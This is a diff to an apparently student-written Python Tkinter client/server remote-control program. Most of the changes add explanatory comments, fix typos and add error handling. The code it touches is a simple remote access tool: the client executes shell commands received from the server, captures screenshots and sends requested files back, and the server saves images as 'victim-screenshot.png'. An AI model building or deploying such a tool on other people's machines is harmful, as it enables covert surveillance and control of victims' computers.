@@ -27,6 +27,7 @@ font_name = 'Verdana'
 
 
 # ____________________server-socket____________________
+# Backend of our server-GUI
 class Server():
 
     def __init__(self):
@@ -41,7 +42,7 @@ class Server():
         self.accept_client_bool = True
         self.capture_ping_bool = True
 
-        # If the user, from other pages(ex.Command Line) wants to return
+        # If the user, from other pages(ex.Command Line) wants to return to the Connection page, the information will be shoen depending on the connection state
         self.is_client_connected = False
         self.is_server_listening = False
 
@@ -49,9 +50,11 @@ class Server():
         self.client = None
 
 
-
+    # After the connection, the client sends a message("ping"), server captures that 'ping' and sends back a message("pong"), this will happen each 3 seconds
+    # with this algorithm we know if the client and server is connected or if there is an internet problem, we can handle that kind of error!
+    # if the server does not recieves any ping from the client, after 6 seconds, the server disconnects the client
     def capture_ping(self, ip_addr, port):
-
+        # If the server start listening with out a problem, self.accept_client_bool will be True
         try:
             self.ping_socket.bind((ip_addr, (int(port))))
             self.ping_socket.listen(1)
@@ -69,7 +72,7 @@ class Server():
                 run_login.run_server.socket_error.config(text=error)
 
             self.accept_client_bool = False
-
+        # After the server starts listening successfully:
         if self.accept_client_bool:
             run_login.run_server.listen_btn.config(state='disabled')
             run_login.run_server.print_server_connection_state.config(text='Listening...')
@@ -77,6 +80,7 @@ class Server():
                 run_login.run_server.socket_error.destroy()
 
         while self.accept_client_bool:
+            # Here the server accepts the client for the first time or we are waiting for the client to reconnect
             read, _, _ = select.select([self.ping_socket], [], [], 0.5)
             if self.ping_socket in read:
                 self.client_ping, self.addr_ping = self.ping_socket.accept()
@@ -100,6 +104,8 @@ class Server():
                 started_time = time()
             else:
                 continue
+
+            #in this loop we recieve the ping and send pong, in other cases we close the clients and stop the loop and we wait for the clients to reconnect!
             while self.capture_ping_bool:
                 readable, _, _ = select.select([self.client_ping], [], [], 1)
                 if self.client_ping in readable:
@@ -109,12 +115,23 @@ class Server():
                         if str(e) == "[Errno 9] Bad file descriptor":
                             continue
 
-
                     if self.ping == b'ping':
-                        self.client_ping.sendall(b'pong')
-                        self.is_client_connected = True
-                        root.configure(background='green')
-                        started_time = time()
+                        try:
+                            self.client_ping.sendall(b'pong')
+                            self.is_client_connected = True
+                            root.configure(background='green')
+                            started_time = time()
+                        except:
+                            self.client_ping.close()
+                            self.client.close()
+                            self.client_ping = None
+                            self.is_server_listening = True
+                            self.is_client_connected = False
+                            run_login.run_server.addr_0_label.config(text="")
+                            run_login.run_server.addr_1_label.config(text="")
+                            run_login.run_server.right_bar_client_label.config(text="Disconnected!")
+
+                            break
 
                     elif(int(time() - started_time)) > 5:
                         self.client_ping.close()
@@ -128,6 +145,7 @@ class Server():
 
                         break
 
+                    # After the 3 seconds, which means that we have not recved and pink, we just change the background color to red
                     elif(int(time() - started_time)) > 2:
                         root.configure(background='red')
                         self.is_server_listening = True
@@ -136,7 +154,7 @@ class Server():
                         pass
 
         
-    # Whith this fuction we send our command to the client
+    # With this fuction we send our command to the client
     def send_command(self):
         self.cmnd = run_login.run_server.command_entry.get()
         run_login.run_server.command_entry.delete(0, tk.END)
@@ -162,7 +180,7 @@ class Server():
             
             
         
-
+    # After we send the commands, we recieve the output with this function
     def recv_out_put(self):
         while self.recv_out_put_bool:
             try:
@@ -176,6 +194,7 @@ class Server():
                         self.client.close()
                         self.is_client_connected = False
                         break
+                    # in the case of screenshot command we recieve the image of the screenshot of the client
                     if self.output == "screenshot--*#($)&":
                         self.client.sendall(b'ok')
                         data = self.client.recv(1024).decode()
@@ -192,12 +211,14 @@ class Server():
                                     if not data:
                                         break
                                 self.client.sendall(b'ok')
+                            # After we recieve the screenshot image we open it automaticlly
                             subprocess.run(['xdg-open', 'victim-screenshot.png'])
                         except:
                             pass
                         if data == "not ok":
                             run_login.run_server.output_list.insert(tk.END, "can't screenshot")
 
+                    # in the case of showfile command, we recieve the file from the client and save to the same directory with the program
                     elif self.output == "showfile--*#($)&":
                         self.client.sendall(b'ok')
                         data = self.client.recv(1024).decode()
@@ -221,6 +242,7 @@ class Server():
 
 
                     else:
+                        # Because the tkinter.Listbox doesn't read '\n' we have to seperate them manually
                         self.output_lines = self.output.split('\n')
                         for self.line in self.output_lines:
                             run_login.run_server.output_list.insert(tk.END, self.line)
@@ -240,6 +262,7 @@ class Server():
 
 
 # ____________________client-socket____________________
+# Backend of client-GUI
 class Client():
 
     def __init__(self):
@@ -248,13 +271,16 @@ class Client():
 
         self.client_windows_username = getuser()
 
+        # Connection state of client
         self.is_client_connecting = False
         self.is_connected_to_server = False
 
+        # Boolean variables to stop the threads 
         self.client_connecting_bool = True
         self.cln_send_ping_bool = False
         self.get_send_command_bool = True
 
+    # In this function we connect to the server and start sending 'ping' each 3 seconds
     def client_connect(self, ip_addr, port, time=3):
         self.is_client_connecting = True
 
@@ -278,6 +304,7 @@ class Client():
 
             except socket.error as error:
 
+                # If there is no server to connect, we wait for 2 seconds and try again to connect
                 if str(error) == "[Errno 111] Connection refused":
                     try:
                         run_login.run_client.print_connection_state_label.config(text='Connecting')
@@ -335,6 +362,7 @@ class Client():
                             except:
                                 continue
 
+    # This function of client, recieves the commands and execute them using subproccess and send backs to the server the output
     def get_send_command(self):
         while self.get_send_command_bool:
             if self.client_socket.fileno() != -1:
@@ -343,18 +371,23 @@ class Client():
                     try:
                         self.command = self.client_socket.recv(1024).decode()
 
+                        # If the command is exit, we close the program
                         if self.command == "exit":
                             pid = os.getpid()
                             os.kill(pid, signal.SIGTERM)
                             exit_program()
 
+                        # we change the directory using os library
                         elif self.command[0:3] == "cd ":
                             os.chdir(self.command[3:])
                             self.client_socket.send(os.getcwd().encode())
 
+                        # we take screenshot of out window and send to the server
                         elif self.command == 'screenshot':
                             try:
+                                # we tell the server to get ready to accept the screenshot image
                                 self.client_socket.send("screenshot--*#($)&".encode())
+                                # Server sends back a message to confirm it
                                 self.client_socket.recv(1024)
                                 try:
                                     self.file_name = "screenshot--*#($)&.png"
@@ -384,6 +417,7 @@ class Client():
                             except:
                                 pass
 
+                        # we send the file which server asked
                         elif self.command[0:8] == "showfile":
                             try:
                                 self.file_name = self.command[9:]
@@ -444,7 +478,9 @@ class Client():
                 root.configure(background='red')
                 break
 
+
 # ____________________login-window____________________
+# The gui window which will be shown in the beggining of the program that the program user can choose: server or client
 class Login_frame():
     
     def __init__(self, window):
@@ -457,6 +493,7 @@ class Login_frame():
         x_offset = (screen_windth - WIDTH) // 2
         y_offset = (screen_height - HEIGHT) // 2
 
+        # i usually use f"" , but just wanted to test the old fashion way!
         root.geometry("{}x{}+{}+{}".format(WIDTH, HEIGHT, x_offset, y_offset))
         
         destroy_old_frames(self.window)
@@ -523,6 +560,7 @@ class Login_frame():
 
 
 # ____________________server-window____________________
+# SERVER-GUI
 class Server_frame():
     def __init__(self, window):
         
@@ -596,7 +634,7 @@ class Server_frame():
 
 
         # --------------------right bar--------------------
-        # ----------Client----------
+        # ----Client-information----
         self.right_bar_client_frame = tk.Frame(self.right_frame)
 
         self.right_bar_client_frame.place(x=5, y=5)
@@ -645,9 +683,9 @@ class Server_frame():
     # All the Pages that the user can access pressing the left bar buttons
 
     # ----------Back page----------
-    # Δεν Δουλεύει και δεν τα κατάφερα ακόμα!
     def choose_user_page(self):
 
+        # we stop the threads here
         run_login.server.recv_out_put_bool = False
         run_login.server.accept_client_bool = False
         run_login.server.capture_ping_bool = False
@@ -663,7 +701,7 @@ class Server_frame():
         run_login.show()
 
 
-    # --------------------Connection page--------------------
+    # --------------------Connection-page--------------------
     def connect_page(self):
         self.indicate(self.connect_btn)
 
@@ -767,7 +805,8 @@ class Server_frame():
                                      )
         self.output_label.place(x=50, y=20)
         
-        # ----------------------------------------Listbox scrollbar----------------------------------------
+        # ----------------------------------------Listbox-scrollbar----------------------------------------
+        # Command-Line
 
         self.output_list = tk.Listbox(self.output_frame,
                                       font=(font_name, 20),
@@ -783,7 +822,6 @@ class Server_frame():
         self.scrollbar.config(command=self.output_list.yview)
 
         # --------------------------------------------------------------------------------------------------
-
 
         self.print_new_command_label = tk.Label(self.main_frame,
                                                 text='New Command:',
@@ -805,6 +843,7 @@ class Server_frame():
         self.send.place(x=450, y=825)
 
     # ----------Help page----------
+    # The Manual of our program
     def help_page(self):
         self.indicate(self.help_btn)
         self.help_page_frame = tk.Frame(self.main_frame)
@@ -918,10 +957,8 @@ AUTHOR
 
 
 
-
-
-
 # ____________________client-window____________________
+# CLIENT-GUI
 class Client_frame():
     def __init__(self, window):
 
@@ -1166,15 +1203,18 @@ AUTHOR
 
 # ____________________Functions____________________
 
+# Each time we change pages, we destroy the old page(frames), and append the conntend to the new page(frame)
 def destroy_old_frames(frame):
     for children_frame in frame.winfo_children():
         children_frame.destroy()
 
 
+# This function return the users private ip address
 def get_private_ip_address():
     try:
         # If it is connected to Internet, the function returns the private ip address
         temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # '8.8.8.8' it is for google and it is always running
         temp_socket.connect(('8.8.8.8', 80))
         ip_address = temp_socket.getsockname()[0]
         # otherwise return the local ip
@@ -1185,6 +1225,7 @@ def get_private_ip_address():
     return ip_address
 
 
+# Fuctions that check if an ip address is valid
 def is_valid_ip_address(ip_address):
     segments = ip_address.split(".")
     if len(segments) != 4:
@@ -1197,6 +1238,7 @@ def is_valid_ip_address(ip_address):
     return True
 
 
+# Functions that check if a port number is valid
 def is_valid_port(port):
     try:
         port = int(port)
@@ -1208,6 +1250,7 @@ def is_valid_port(port):
         return False
 
 
+# Exits the program, stopping the threads before
 def exit_program():
     if hasattr(run_login, "server"):
         run_login.server.recv_out_put_bool = False
@@ -1241,6 +1284,7 @@ def exit_program():
     exit()
 
 
+# If users press the x-button(on the top right), we first ask, and then close the program
 def x():
     if messagebox.askokcancel("Quit", "Do you want to quit?"):
         exit_program()
